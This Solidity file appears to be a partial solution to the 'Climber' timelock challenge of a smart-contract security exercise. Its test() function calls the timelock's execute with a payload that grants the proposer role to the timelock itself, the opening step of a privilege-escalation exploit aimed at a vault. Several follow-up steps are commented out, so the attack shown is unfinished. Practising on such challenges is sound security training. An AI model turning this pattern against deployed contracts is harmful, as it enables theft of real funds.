// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./ClimberTimelock.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./ClimberTimelockBase.sol";
import {ADMIN_ROLE, PROPOSER_ROLE, MAX_TARGETS, MIN_TARGETS, MAX_DELAY} from "./ClimberConstants.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

contract testlock {
    address[] private targets;
    uint256[] private values;
    bytes[] private dataElements;
    bytes[] private dataElements1;
    bytes32 private salt;
    ClimberTimelock public timelock;
    address private vault;
    address private attacker;

    constructor (address payable _timelock, address _vault, address _attacker) {
        timelock = ClimberTimelock(_timelock);
        vault = _vault;
        attacker = _attacker;
    }

    function test () public {
        // update delay to 0 to execute tasks instantly
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(abi.encodeWithSelector(timelock.grantRole.selector, PROPOSER_ROLE,address(timelock)));
        //dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", uint64(0)));
        salt = keccak256("SALT");
        //dataElements1.push(abi.encodeWithSelector(timelock.schedule.selector, targets,values,dataElements,salt));
        //timelock.schedule(targets, values, dataElements, salt);
        
        timelock.execute(targets, values, dataElements, salt);

    }
}
